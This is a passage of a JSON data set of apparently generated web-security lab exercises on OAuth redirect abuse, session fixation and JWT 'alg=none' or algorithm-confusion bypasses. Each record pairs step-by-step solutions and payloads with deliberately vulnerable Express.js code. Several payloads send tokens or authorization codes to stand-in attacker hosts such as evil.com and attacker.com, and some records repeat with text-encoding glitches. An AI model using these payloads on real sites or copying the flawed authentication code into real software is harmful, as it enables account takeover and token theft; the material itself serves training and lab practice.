      "Use OWASP ZAP to analyze the OAuth login request and identify the vulnerable redirect_uri parameter.",
      "Craft a phishing link that sends the token response to a controlled domain (e.g. https://evil.com/callback).",
      "Simulate clicking the crafted OAuth URL using a browser to confirm the token leaks to your endpoint.",
      "Retrieve the access_token sent to your attacker server from the URL fragment.",
      "Use Postman to replay the token to the /profile endpoint via Authorization: Bearer <token>."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const request = require('request'); const app = express(); const tokens = {}; app.get('/oauth/callback', (req, res) => { const { code, redirect_uri } = req.query; if (!code || !redirect_uri) return res.status(400).send('Missing params');  request.post({ url: 'https://oauth-server/token', form: { code, redirect_uri } }, (err, resp, body) => { const token = JSON.parse(body).access_token; tokens[redirect_uri] = token; res.redirect(redirect_uri + '?access_token=' + token); }); }); app.get('/profile', (req, res) => { const auth = req.headers.authorization; if (!auth) return res.status(401).send('Missing token'); const token = auth.split(' ')[1]; if (token === tokens['https://evil.com/callback']) return res.send('Profile of carlos'); res.status(403).send('Access denied'); }); app.listen(4000, () => console.log('OAuth Redirect lab on http://localhost:4000'));",
    "payloads": [
      "https://vulnerable.app/oauth/callback?code=xyz&redirect_uri=https://evil.com/callback",
      "https://vulnerable.app/oauth/callback?code=abc&redirect_uri=https://attacker.net/steal"
    ]
  },
  {
    "Lab scenario": "Session fixation in login workflow with predictable session ID",
    "Lab Description": "The application does not regenerate session tokens upon login. This allows attackers to set a session ID before authentication and hijack the session post-login. To solve: Fixate a session for Carlos, then reuse it to access his account.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Burp Suite to initiate a session while logged out and intercept the Set-Cookie header to capture a session ID.",
      "Send the session cookie to Carlos via a phishing page that sets document.cookie manually.",
      "Have Carlos log in using that session by simulating browser behavior or CSRF lure.",
      "Re-use the same session cookie in your browser and access /account.",
      "Verify that you're logged in as Carlos and access his account dashboard."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const bodyParser = require('body-parser'); const app = express(); const users = { carlos: 'hunter2' }; const sessions = {}; app.use(cookieParser()); app.use(bodyParser.urlencoded({ extended: true })); app.use((req, res, next) => { const sid = req.cookies.sid || (Math.random().toString(36).substring(7)); res.cookie('sid', sid); req.sid = sid; next(); }); app.post('/login', (req, res) => { const { username, password } = req.body; if (users[username] === password) sessions[req.sid] = username; res.redirect('/account'); }); app.get('/account', (req, res) => { const user = sessions[req.cookies.sid]; if (!user) return res.status(401).send('Not logged in'); res.send(`Welcome, ${user}`); }); app.listen(5000, () => console.log('Session Fixation lab running on http://localhost:5000'));",
    "payloads": [
      "sid=abc123 (sent before login, reused after login by victim)",
      "document.cookie='sid=abc123'; window.location='https://vulnerable.app/login'"
    ]
  },
  {
    "Lab scenario": "Session fixation via predictable session identifier in cookie",
    "Lab Description": "This lab demonstrates a session fixation vulnerability where session identifiers are accepted from the user. The application does not regenerate session tokens upon login. To solve: Fix a session ID, force the victim to authenticate using that session, and access their My account page.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "1. Use Burp Suite to capture a GET request to /login and observe the Set-Cookie header.",
      "2. Modify the cookie to a custom value (e.g., session=attacker123) and reload the login page.",
      "3. Share the crafted login link with the victim (e.g., via email or open redirect) to force login with the fixed session.",
      "4. Once victim logs in, reuse the session=attacker123 cookie to access /my-account as the victim.",
      "5. Confirm access to the victim's account page to solve the lab."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const bodyParser = require('body-parser'); const app = express(); app.use(cookieParser()); app.use(bodyParser.urlencoded({ extended: true })); let sessions = {}; let users = [{ username: 'carlos', password: 'carlos123' }]; app.get('/login', (req, res) => { const sessId = req.cookies.session || 'guest'; sessions[sessId] = { loggedIn: false }; res.send('<form method=\"POST\" action=\"/login\"><input name=\"username\"><input name=\"password\"><button>Login</button></form>'); }); app.post('/login', (req, res) => { const { username, password } = req.body; const sessId = req.cookies.session; const user = users.find(u => u.username === username && u.password === password); if (user && sessId) { sessions[sessId] = { loggedIn: true, username }; res.redirect('/my-account'); } else { res.send('Invalid credentials'); } }); app.get('/my-account', (req, res) => { const sessId = req.cookies.session; const session = sessions[sessId]; if (session && session.loggedIn) { res.send(`Account details for ${session.username}`); } else { res.send('Access denied'); } }); app.listen(4000, () => console.log('Session Fixation Lab running on port 4000'));",
    "payloads": [
      "session=attacker123",
      "session=fixatedtoken",
      "session=xyz987"
    ]
  },
  {
    "Lab scenario": "JWT tampering using 'alg':'none' bypass",
    "Lab Description": "The application uses JWT for user authentication but fails to validate the signature when the algorithm is set to 'none'. The backend incorrectly trusts JWT tokens regardless of signature when alg is 'none'. To solve: Forge an admin JWT and access the admin panel.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1. Use Burp Suite or Postman to capture a JWT-authenticated request after login.",
      "2. Decode the JWT using jwt.io and observe the structure and claims.",
      "3. Modify the 'alg' field to 'none' and change the payload's 'role' claim to 'admin'.",
      "4. Remove the signature portion and reassemble the JWT with only the header and payload.",
      "5. Use the forged token in the Authorization header to access /admin and confirm success."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); const users = [{ username: 'admin', password: 'admin123', role: 'admin' }]; app.use(express.json()); app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (!user) return res.status(401).send('Unauthorized'); const token = jwt.sign({ username: user.username, role: user.role }, 'secret', { algorithm: 'HS256' }); res.json({ token }); }); app.get('/admin', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; const payload = jwt.decode(token, { complete: true }); if (payload.header.alg === 'none') { const decoded = JSON.parse(Buffer.from(token.split('.')[1], 'base64').toString()); if (decoded.role === 'admin') return res.send('Welcome to the admin panel'); } else { try { const verified = jwt.verify(token, 'secret'); if (verified.role === 'admin') return res.send('Welcome to the admin panel'); } catch (e) { return res.status(403).send('Forbidden'); } } res.status(403).send('Forbidden'); }); app.listen(4000, () => console.log('JWT None Bypass Lab running on port 4000'));",
    "payloads": [
      "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6ImFkbWluIn0.",
      "JWT with 'alg':'none' and no signature",
      "Base64(header) + '.' + Base64(payload) + '.'"
    ]
  },
  {
    "Lab scenario": "OAuth misconfiguration allowing code injection via open redirect",
    "Lab Description": "The application uses a third-party OAuth provider for authentication but lacks proper redirect_uri validation. An attacker can inject a malicious redirect URI to intercept the authorization code. To solve: Capture a valid authorization code issued to the victim and use it to log in as the victim.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1. Use OWASP ZAP to map the login flow and identify the redirect_uri parameter in the OAuth flow.",
      "2. Modify the redirect_uri to point to your own server that captures query parameters.",
      "3. Craft a phishing link using the malicious redirect_uri and send it to the victim.",
      "4. Once the victim authorizes access, capture the authorization code from the query string.",
      "5. Use Postman to send a request to the token endpoint with the captured code and log in as the victim."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const axios = require('axios'); const app = express(); app.get('/login', (req, res) => { const redirectUri = req.query.redirect_uri; const state = 'xyz'; const authUrl = `https://oauth.example.com/auth?response_type=code&client_id=123&redirect_uri=${redirectUri}&state=${state}`; res.redirect(authUrl); }); app.get('/callback', async (req, res) => { const { code } = req.query; const tokenRes = await axios.post('https://oauth.example.com/token', { code, client_id: '123', client_secret: 'secret', redirect_uri: 'http://vulnerable-app.com/callback' }); if (tokenRes.data.access_token) res.send('Login successful'); else res.send('Login failed'); }); app.listen(4000, () => console.log('OAuth Misconfig Lab running on port 4000'));",
    "payloads": [
      "redirect_uri=http://attacker.com/intercept?code=",
      "https://vulnerable-app.com/login?redirect_uri=http://evil.com/capture",
      "https://oauth.example.com/auth?client_id=123&redirect_uri=http://attacker.site/log&response_type=code"
    ]
  },
  {
    "Lab scenario": "JWT tampering via none algorithm in login API",
    "Lab Description": "The application uses JSON Web Tokens (JWT) for session management but improperly validates the token's signature algorithm. The login endpoint issues a signed JWT that includes user roles. However, the server accepts tokens with 'alg':'none' without signature verification. To solve: escalate privileges by tampering with the JWT and access the admin dashboard.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "1. Capture the JWT issued upon successful login using Burp Suite.",
      "2. Decode the JWT using jwt.io or a local script and note the algorithm and user role.",
      "3. Modify the JWT header to use \"alg\":\"none\" and change the payload role to \"admin\".",
      "4. Reconstruct the JWT without a signature and replace the Authorization header in Burp.",
      "5. Send a GET request to /admin-panel and verify access is granted using the tampered token."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.json()); const users = [{ username: 'user', password: 'pass', role: 'user' }]; const secret = 'supersecret'; app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (!user) return res.status(401).send('Invalid login'); const token = jwt.sign({ username: user.username, role: user.role }, secret, { algorithm: 'HS256' }); res.json({ token }); }); app.get('/admin-panel', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; const decoded = jwt.decode(token, { complete: true }); if (decoded.header.alg === 'none') { const payload = JSON.parse(Buffer.from(token.split('.')[1], 'base64').toString()); if (payload.role === 'admin') return res.send('Admin access granted'); return res.status(403).send('Forbidden'); } try { const verified = jwt.verify(token, secret); if (verified.role === 'admin') return res.send('Admin access granted'); res.status(403).send('Forbidden'); } catch (e) { res.status(401).send('Invalid token'); } }); app.listen(3000, () => console.log('JWT Lab running on http://localhost:3000'));",
    "payloads": [
      "Authorization: Bearer eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyIsInJvbGUiOiJhZG1pbiJ9.",
      "{\"alg\":\"none\"} + {\"username\":\"carlos\",\"role\":\"admin\"}",
      "JWT with base64-encoded header.payload and no signature"
    ]
  },
  {
    "Lab scenario": "Session fixation via static session ID assignment",
    "Lab Description": "The application assigns session identifiers before authentication and fails to regenerate the session ID after login. This allows an attacker to fix a known session ID and force a victim to use it, enabling full session hijacking after login. To solve: log the victim in using the fixed session and access their profile page.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1. Visit the application and capture the Set-Cookie header using OWASP ZAP.",
      "2. Note that the session ID remains the same pre- and post-login.",
      "3. Generate a malicious login link embedding a known session ID (e.g., using a hidden iframe).",
      "4. Trick the victim into logging in with this fixed session via phishing or social engineering.",
      "5. Use the known session ID to access /profile while impersonating the victim after login."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const session = require('express-session'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.urlencoded({ extended: true })); app.use(session({ secret: 'fixation-secret', resave: false, saveUninitialized: true })); const users = [{ username: 'victim', password: 'pass123' }]; app.get('/login', (req, res) => { res.send(`<form method='POST' action='/login'><input name='username'/><input name='password'/><button>Login</button></form>`); }); app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (!user) return res.send('Login failed'); req.session.user = username; res.redirect('/profile'); }); app.get('/profile', (req, res) => { if (req.session.user) return res.send(`Welcome ${req.session.user}`); res.status(401).send('Unauthorized'); }); app.listen(3000, () => console.log('Session Fixation Lab running on http://localhost:3000'));",
    "payloads": [
      "Use preset session cookie: sessionId=knownSessionID",
      "Malicious link: http://target-app/login with crafted cookie header",
      "Force session: document.cookie = 'connect.sid=knownSessionID'"
    ]
  },
  {
    "Lab scenario": "OAuth misconfiguration allowing token reuse across clients",
    "Lab Description": "The app integrates with an external OAuth provider but does not restrict token audience. As a result, access tokens issued for one client (mobile app) can be reused on the web client. To solve: intercept a token issued to another client and reuse it on the vulnerable web interface to access user info.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1. Use Burp Suite to proxy traffic from the mobile app emulator (or inspect API calls).",
      "2. Capture an OAuth access token issued to the mobile client during login flow.",
      "3. Observe the token lacks 'aud' or 'azp' checks on the server side.",
      "4. Send the token to the web client's /user-info endpoint via Postman.",
      "5. Receive unauthorized access to a web user profile using the reused token."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const jwt = require('jsonwebtoken'); const app = express(); app.use(bodyParser.json()); const users = [{ id: 1, name: 'carlos', email: 'carlos@domain.com' }]; const oauthPublicKey = 'public-oauth-key'; app.post('/user-info', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; try { const decoded = jwt.verify(token, oauthPublicKey, { algorithms: ['RS256'], ignoreExpiration: false }); const user = users.find(u => u.email === decoded.email); if (user) return res.json(user); res.status(404).send('User not found'); } catch (e) { res.status(401).send('Invalid token'); } }); app.listen(3000, () => console.log('OAuth Token Reuse Lab running on http://localhost:3000'));",
    "payloads": [
      "Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9...",
      "Use mobile-issued access token on /user-info endpoint",
      "Token with mismatched audience field used in web flow"
    ]
  },
  {
    "Lab scenario": "JWT algorithm confusion in authorization header",
    "Lab Description": "The application implements JWT-based authentication using the RS256 algorithm, but fails to properly validate the algorithm header, allowing algorithm substitution attacks. The application accepts JWT tokens in the Authorization header to access protected resources. To solve: forge a valid JWT token with admin privileges and access the /admin panel.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Burp Suite to intercept a valid JWT and decode it using jwt.io or Burp Decoder.",
      "Observe that the 'alg' is set to RS256 but the server does not enforce key type during validation.",
      "Replace 'alg' with HS256 and use the public RSA key as the HMAC secret to re-sign the token using a tool like jwt_tool or CyberChef.",
      "Modify the payload to include { \"role\": \"admin\" } and sign it using HS256 and the public key.",
      "Send a request with the forged JWT in the Authorization header to /admin and verify access is granted."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const fs = require('fs'); const app = express(); const PUBLIC_KEY = fs.readFileSync('./public.pem'); app.get('/admin', (req, res) => { const authHeader = req.headers['authorization']; if (!authHeader) return res.status(401).send('Missing token'); const token = authHeader.split(' ')[1]; try { const decoded = jwt.verify(token, PUBLIC_KEY); if (decoded.role === 'admin') { return res.send('Welcome Admin'); } res.status(403).send('Not authorized'); } catch (err) { res.status(401).send('Invalid token'); } }); app.listen(4000);",
    "payloads": [
      "{ \"alg\": \"HS256\", \"typ\": \"JWT\" }.{ \"role\": \"admin\", \"user\": \"carlos\" } signed with public key as HMAC",
      "jwt_tool token.jwt -X -a HS256 -s public.pem -p '{\"role\":\"admin\"}'"
    ]
  },
  {
    "Lab scenario": "Session fixation via unvalidated session token reuse",
    "Lab Description": "The application sets a session cookie before login but fails to generate a new session upon authentication, making it vulnerable to session fixation. The session ID is stored in a cookie named 'sessionid'. To solve: fix a session before login, force the victim to log in, and reuse their session to access their account page.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use OWASP ZAP or Burp Suite to capture a GET /login request and obtain a pre-auth sessionid cookie.",
      "Send the crafted login link to the victim with the sessionid set via a cookie or URL parameter.",
      "Wait until the victim logs in and their account is bound to the fixed session.",
      "Replay the sessionid cookie in a GET /account request.",
      "Access the account dashboard and confirm it belongs to the victim."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const bodyParser = require('body-parser'); const app = express(); app.use(cookieParser()); app.use(bodyParser.urlencoded({ extended: true })); const users = { 'carlos': 'password123' }; const sessions = {}; app.get('/login', (req, res) => { const sid = req.cookies.sessionid || Math.random().toString(36).substring(2); res.cookie('sessionid', sid); res.send('<form method=\"POST\" action=\"/login\"><input name=\"username\"><input name=\"password\" type=\"password\"></form>'); }); app.post('/login', (req, res) => { const { username, password } = req.body; if (users[username] === password) { sessions[req.cookies.sessionid] = username; res.redirect('/account'); } else { res.send('Login failed'); } }); app.get('/account', (req, res) => { const user = sessions[req.cookies.sessionid]; if (user) { res.send(`Welcome ${user}`); } else { res.send('Not logged in'); } }); app.listen(4000);",
    "payloads": [
      "Set-Cookie: sessionid=fixed123; path=/",
      "https://example.com/login?sessionid=fixed123",
      "GET /account with Cookie: sessionid=fixed123 after victim logs in"
    ]
  },
  {
    "Lab scenario": "OAuth implicit flow token leak via referrer header",
    "Lab Description": "The application uses the OAuth 2.0 implicit grant flow for authentication but redirects users to a third-party domain while retaining the access token in the URL fragment. This results in the token being leaked via the Referer header. To solve: steal the victim's access token and use it to retrieve their profile information.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Set up a malicious site or Burp Collaborator endpoint to collect Referer headers.",
      "Send a crafted phishing link to the victim: https://vuln-app.com/callback#access_token=xyz123...",
      "Ensure the application redirects to a malicious domain like https://attacker.com/log",
      "Capture the full Referer containing the access_token using the Collaborator payload.",
      "Replay the token in an Authorization header to GET /api/userinfo and extract the user's email."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const app = express(); const accessTokens = { 'xyz123': 'carlos@example.com' }; app.get('/callback', (req, res) => { res.redirect('https://attacker.com/log'); }); app.get('/api/userinfo', (req, res) => { const auth = req.headers['authorization']; if (!auth) return res.status(401).send('No token'); const token = auth.split(' ')[1]; if (accessTokens[token]) { res.send(`Email: ${accessTokens[token]}`); } else { res.status(403).send('Invalid token'); } }); app.listen(4000);",
    "payloads": [
      "https://vuln-app.com/callback#access_token=xyz123",
      "GET /api/userinfo with Authorization: Bearer xyz123",
      "Referer: https://vuln-app.com/callback#access_token=xyz123 sent to https://attacker.com/log"
    ]
  },
  {
    "Lab scenario": "Session Fixation in Login Flow",
    "Lab Description": "The application uses a custom session mechanism without regenerating session IDs after login. The application issues a session cookie before authentication and reuses it post-login without regeneration. To solve: Fixate a session ID, get the victim to use it, then hijack their session to access their dashboard.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Burp Suite to intercept GET /login and note issued session ID in Set-Cookie",
      "Send victim a phishing link with the fixated session ID in a pre-authenticated cookie",
      "Wait until the victim logs in with the attacker-provided session",
      "Reuse the same session ID in attacker\u00e2\u20ac\u2122s browser after victim login",
      "Access /dashboard using the fixated session ID to confirm hijack"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const app = express(); app.use(cookieParser()); app.use(express.urlencoded({ extended: true })); const sessions = {}; const users = [{ username: 'victim', password: 'pass123' }]; app.get('/login', (req, res) => { const sid = Math.random().toString(36); sessions[sid] = { authenticated: false }; res.cookie('session', sid); res.send('<form method=\"POST\">Login Form</form>'); }); app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (user) { const sid = req.cookies.session; sessions[sid].authenticated = true; sessions[sid].username = username; res.redirect('/dashboard'); } else { res.status(401).send('Invalid credentials'); } }); app.get('/dashboard', (req, res) => { const sid = req.cookies.session; const session = sessions[sid]; if (session && session.authenticated) res.send('Welcome ' + session.username); else res.status(403).send('Unauthorized'); }); app.listen(3000);",
    "payloads": [
      "GET /login (extract Set-Cookie: session=XYZ)",
      "Set-Cookie: session=XYZ (in victim's browser)",
      "Use session=XYZ post victim-login to access /dashboard"
    ]
  },
  {
    "Lab scenario": "JWT Tampering using 'none' Algorithm",
    "Lab Description": "The application trusts JWTs signed with the 'none' algorithm and does not validate their integrity. The JWT is used for session authentication. To solve: Forge an admin token with 'none' as algorithm and escalate privileges.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Postman to log in and extract JWT token from /auth/login response",
      "Decode JWT at jwt.io and note payload/alg",
      "Modify JWT payload to {\"username\":\"admin\",\"role\":\"admin\"}, set alg to 'none'",
      "Remove signature and re-encode token",
      "Use Burp to inject forged token into Authorization header and access /admin"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); app.use(express.json()); const users = [{ username: 'admin', password: 'rootpass', role: 'admin' }]; app.post('/auth/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (user) { const token = jwt.sign({ username: user.username, role: user.role }, 'secret'); res.json({ token }); } else { res.status(401).send('Invalid credentials'); } }); app.get('/admin', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; const decoded = jwt.decode(token, { complete: true }); if (decoded && decoded.payload.role === 'admin') { res.send('Welcome admin'); } else { res.status(403).send('Access denied'); } }); app.listen(4000);",
    "payloads": [
      "JWT: {\"alg\":\"none\",\"typ\":\"JWT\"}.{\"username\":\"admin\",\"role\":\"admin\"}.",
      "Authorization: Bearer [forged_token]",
      "jwt.io or jwt-tool to manipulate header/payload"
    ]
  },
  {
    "Lab scenario": "OAuth Misconfiguration in Token Exchange Flow",
    "Lab Description": "The application integrates with an OAuth provider but does not validate the audience (aud) field in the ID token. This allows a malicious app to reuse a token issued for another client. To solve: Use an ID token issued to another client to access protected resources.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use OWASP ZAP or Postman to authorize using attacker-controlled OAuth client",
      "Obtain a valid ID token from the provider using /oauth/token",
      "Replay the ID token to the target app at /auth/callback",
      "The app fails to validate aud field and accepts the token",
      "Access /user/profile to confirm account takeover"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const axios = require('axios'); const app = express(); app.use(express.json()); app.post('/auth/callback', async (req, res) => { const { id_token } = req.body; try { const decoded = jwt.decode(id_token); if (!decoded) return res.status(401).send('Invalid token');  req.session = { user: decoded.email }; res.send('Logged in as ' + decoded.email); } catch (err) { res.status(400).send('Token error'); } }); app.get('/user/profile', (req, res) => { if (!req.session) return res.status(401).send('Not logged in'); res.send('Profile of ' + req.session.user); }); app.listen(5000);",
    "payloads": [
      "Valid ID token from attacker-client with aud=attacker-app",
      "Replay token to /auth/callback of victim app",
      "Decoded payload: {\"email\":\"victim@example.com\",\"aud\":\"attacker-app\"}"
    ]
  },
  {
    "Lab scenario": "Session Fixation in Cookie-Based Login Flow",
    "Lab Description": "The application fails to regenerate session identifiers upon successful login. As a result, an attacker can set a session ID before authentication and reuse it post-login. The application assigns session IDs via cookies before authentication, and fails to issue a new one after. To solve: log in as Carlos using a session fixation attack.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Intercept initial GET /login request using Burp Suite and capture Set-Cookie: sessionId.",
      "Send sessionId=attacker-session in a GET /login request and observe it's accepted unauthenticated.",
      "Craft a phishing email with a link containing the pre-defined session ID and send it to Carlos.",
      "Carlos logs in, binding the fixed session ID to his authenticated session.",
      "Reuse the same sessionId in a new browser session to access /my-account and solve the lab."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const app = express(); const cookieParser = require('cookie-parser'); app.use(cookieParser()); const users = [{ username: 'carlos', password: 'securepass' }]; const sessions = {}; app.use((req, res, next) => { if (!req.cookies.sessionId) { const sid = Math.random().toString(36).substring(2); res.cookie('sessionId', sid); sessions[sid] = { authenticated: false }; } next(); }); app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (user) { sessions[req.cookies.sessionId].authenticated = true; res.send('Logged in'); } else { res.status(401).send('Invalid login'); } }); app.get('/my-account', (req, res) => { if (sessions[req.cookies.sessionId]?.authenticated) { res.send('Account: carlos'); } else { res.status(403).send('Forbidden'); } });",
    "payloads": [
      "Cookie: sessionId=attacker-session",
      "Set sessionId via phishing link, e.g., /login with Cookie: sessionId=attacker-session",
      "Reuse: Cookie: sessionId=attacker-session after Carlos logs in"
    ]
  },
  {
    "Lab scenario": "JWT Tampering in Authorization Header",
    "Lab Description": "The application uses JWTs for session management but fails to validate the algorithm properly. It accepts unsigned tokens if the 'alg' is set to 'none'. To solve: forge a JWT for Carlos and access the protected account page without knowing the secret.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Log in as any user and capture the JWT in Authorization: Bearer header using Burp Suite.",
      "Decode the JWT using jwt.io or jwt_tool and observe the 'alg' header set to 'HS256'.",
      "Create a new JWT with header {\"alg\":\"none\"} and payload {\"username\":\"carlos\"}.",
      "Remove the signature part and reassemble the JWT.",
      "Send the forged JWT in Authorization: Bearer <token> to /my-account and verify access."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.json()); const secret = 'supersecret'; app.post('/login', (req, res) => { const { username, password } = req.body; if (username === 'carlos' && password === '123') { const token = jwt.sign({ username: 'carlos' }, secret); res.json({ token }); } else { res.status(401).json({ error: 'Invalid credentials' }); } }); app.get('/my-account', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; try { const decoded = jwt.verify(token, secret, { algorithms: ['HS256', 'none'] }); if (decoded.username === 'carlos') res.send('Account: carlos'); else res.status(403).send('Forbidden'); } catch (e) { res.status(400).send('Invalid token'); } });",
    "payloads": [
      "JWT with header: {\"alg\":\"none\"}, payload: {\"username\":\"carlos\"}",
      "Authorization: Bearer <base64(header)>.base64(payload).",
      "Tool: jwt_tool -t jwt -X alg_none -pc '{\"username\":\"carlos\"}'"
    ]
  },
  {
    "Lab scenario": "OAuth Token Leakage in Redirect URI",
    "Lab Description": "The application uses OAuth with an implicit grant flow that leaks access tokens via a redirection URI susceptible to open redirect. This allows attackers to harvest tokens if the user authorizes the app. To solve: steal Carlos's OAuth token and access his account.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Inspect the OAuth login flow and identify the redirection URI pattern using OWASP ZAP.",
      "Craft an authorization request with a malicious redirect_uri (e.g., attacker.com/steal-token).",
      "Send the phishing link to Carlos and wait for him to authorize the app.",
      "Capture the token in the fragment portion of the redirected URL.",
      "Replay the token in Authorization: Bearer <token> to access /my-account."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const app = express(); const qs = require('querystring'); const users = [{ username: 'carlos' }]; const tokens = {}; app.get('/auth', (req, res) => { const { redirect_uri, response_type, client_id } = req.query; if (response_type === 'token') { const token = Buffer.from('token-carlos').toString('base64'); tokens[token] = 'carlos'; res.redirect(`${redirect_uri}#access_token=${token}&token_type=bearer`); } else { res.status(400).send('Unsupported flow'); } }); app.get('/my-account', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; const user = tokens[token]; if (user === 'carlos') { res.send('OAuth access to carlos'); } else { res.status(403).send('Forbidden'); } });",
    "payloads": [
      "GET /auth?response_type=token&client_id=trusted-app&redirect_uri=https://attacker.com/steal-token",
      "Captured URL fragment: #access_token=encoded-token&token_type=bearer",
      "Authorization: Bearer token-carlos (decoded)"
    ]
  },
  {
    "Lab scenario": "OAuth login session fixation in third-party auth flow",
    "Lab Description": "The OAuth login implementation in this app fails to issue a new session ID after authentication. The application reuses session cookies from unauthenticated requests. To solve: force a victim to authenticate with a session you control and gain access to their authenticated session.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Intercept OAuth login flow using Burp Suite's Proxy while initiating login via 'Login with GitHub'.",
      "Confirm that session cookie remains the same before and after authentication.",
      "Craft a malicious OAuth login URL and send to the victim (phishing or social engineering) while reusing the session cookie.",
      "After victim logs in, use the original session cookie from your browser to access their authenticated session.",
      "Verify successful takeover by navigating to /my-account and seeing the victim's data."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const session = require('express-session'); const app = express(); const passport = require('passport'); const GitHubStrategy = require('passport-github2').Strategy; app.use(session({ secret: 'vuln-session', resave: true, saveUninitialized: true })); app.use(passport.initialize()); app.use(passport.session()); passport.use(new GitHubStrategy({ clientID: 'GITHUB_ID', clientSecret: 'GITHUB_SECRET', callbackURL: '/auth/github/callback' }, (accessToken, refreshToken, profile, done) => { return done(null, profile); })); app.get('/auth/github', passport.authenticate('github')); app.get('/auth/github/callback', passport.authenticate('github', { failureRedirect: '/' }), (req, res) => { res.redirect('/my-account'); }); app.get('/my-account', (req, res) => { res.send('Welcome ' + req.user.username); }); app.listen(4000, () => console.log('OAuth Lab running'));",
    "payloads": [
      "Set sessionid=attacker-session before auth redirect",
      "Send GitHub OAuth link to victim with attacker\u00e2\u20ac\u2122s session cookie",
      "Access /my-account using same cookie after victim login"
    ]
  },
  {
    "Lab scenario": "JWT authentication bypass via 'alg=none'",
    "Lab Description": "The server trusts JWTs without properly verifying their signature when the algorithm is set to 'none'. The application decodes and accepts tokens without validation. To solve: craft a JWT with admin privileges using 'alg':'none' and access the admin panel.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Burp Suite to intercept a request and extract the Authorization Bearer token.",
      "Decode JWT at jwt.io and inspect the header and payload.",
      "Replace the 'alg' value with 'none' and change 'role' to 'admin' in the payload.",
      "Remove the signature part and reassemble the token using base64-encoded header and payload only.",
      "Send the modified token in Authorization header and access /admin to verify access."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); app.use(express.json()); app.post('/login', (req, res) => { const { username } = req.body; const token = jwt.sign({ username: username, role: 'user' }, 'supersecret'); res.json({ token }); }); app.get('/admin', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; const payload = jwt.decode(token); if (payload?.role === 'admin') return res.send('Welcome Admin'); res.status(403).send('Forbidden'); }); app.listen(4000, () => console.log('JWT Lab running'));",
    "payloads": [
      "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyIsInJvbGUiOiJhZG1pbiJ9.",
      "Authorization: Bearer [Modified JWT]",
      "Use jwt.io to craft unsigned JWT manually"
    ]
  },
  {
    "Lab scenario": "Blind session hijacking via verbose error leakage",
    "Lab Description": "The application exposes detailed error logs that include session identifiers when unexpected input is provided. The error handler returns stack traces with sensitive tokens. To solve: force a 500 error, extract another user's session ID from the error, and use it to impersonate them.",
    "Difficulty Level": "Hard",
